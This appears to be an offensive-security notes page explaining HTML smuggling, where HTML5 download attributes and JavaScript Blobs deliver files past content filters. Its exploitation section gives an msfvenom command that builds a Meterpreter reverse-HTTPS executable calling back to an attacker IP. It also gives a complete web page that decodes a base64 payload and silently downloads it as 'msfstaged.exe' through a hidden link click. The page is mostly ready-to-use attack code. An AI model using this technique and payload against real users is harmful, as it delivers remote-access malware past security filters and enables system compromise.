# ⭕ HTML Smuggling

{% embed url="https://outflank.nl/blog/2018/08/14/html-smuggling-explained" %}

{% embed url="https://github.com/Arno0x/EmbedInHTML" %}

Using a combination of HTML5 and JavaScript to sneak malicious files past content filters.This mechanism has been incorporated into popular offensive frameworks such as [Demiguise](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/august/smuggling-hta-files-in-internet-exploreredge/) and [SharpShooter](https://github.com/mdsecactivebreach/SharpShooter) .



## <mark style="color:red;">HTML5 download attribute</mark>

HTML5 introduced the [“download” attribute](https://www.w3schools.com/tags/att\_a\_download.asp) for anchor tags. Consider the following line of HTML, which is supported by all modern browsers:

```html
<a href="/files/doc123.doc" download="myfile.doc">Click</a>
```

When a user clicks on the hyperlink, the download attribute instructs the browser to download the target pointed to by the href attribute and save it to disk as “myfile.doc”. Of course, the anchor and its download attribute can also be created using JavaScript instead of HTML:

```
var myAnchor = document.createElement('a');
myAnchor.download = 'filename.doc';
```

## <mark style="color:red;">Blobs and URLs</mark>

A Blob is an immutable object that represents raw data. Blobs allow you to construct file-like objects on the client that you can pass to JavaScript APIs that expect URLs. Instead of requiring that the web server provides the file, the Blob can be constructed locally using pure JavaScript.

```javascript
var myBlob = new Blob([myData], {type: 'octet/stream'});
```

This line creates a Blob of MIME type “octet/stream” and fills is with the data contained in variable myData. We can then use URL.createObjectURL to create a URL from our Blob object and have an anchor point to it:

```javascript
var myUrl = window.URL.createObjectURL(blob);
myAnchor.href = myUrl;
```

Lastly, we can simulate a click on the anchor object using JavaScript’s HTMLElement.click() method:

```javascript
myAnchor.click();
```

This will result in triggering the anchor’s click event, which in turn points to our Blob and which will be downloaded as “filename.doc” (since we specified the download attribute). These features are supported by all major modern browsers. For older versions of Internet Explorer (not Edge) we can revert to the msSaveBlob method to save a Blob object to disk.

## <mark style="color:red;">Exploitation</mark>

First, our Base64 code is placed into an array buffer, byte-by- byte.&#x20;

```
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o /var/www/html/msfstaged.exe

base64 /var/www/html/msfstaged.exe
```

We’ll then place the array buffer into our Blob. Next, we’ll create a hidden “a” tag. The data from our Blob is then moved to the href reference of our “a” tag. Our Blob code in the href is given the file name of ‘msfnonstaged.exe’. Finally, a click action is performed to download our file. The complete webpage used to trigger the HTML smuggling with the Meterpreter executable is given below:

```html
<html>
    <body>
        <script>
        function base64ToArrayBuffer(base64) {
            var binary_string = window.atob(base64);
            var len = binary_string.length;
            var bytes = new Uint8Array( len );
            for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i);}
            return bytes.buffer;
        }
        var file ='BASE 64 ENCODED PAYLOAD'
        var data = base64ToArrayBuffer(file);
        var blob = new Blob([data], {type: 'octet/stream'});
        var fileName = 'msfstaged.exe';
        var a = document.createElement('a');
        document.body.appendChild(a);
        a.style = 'display: none';
        var url = window.URL.createObjectURL(blob);
        a.href = url;
        a.download = fileName;
        a.click();
        window.URL.revokeObjectURL(url);
        </script>
    </body>
</html>
```
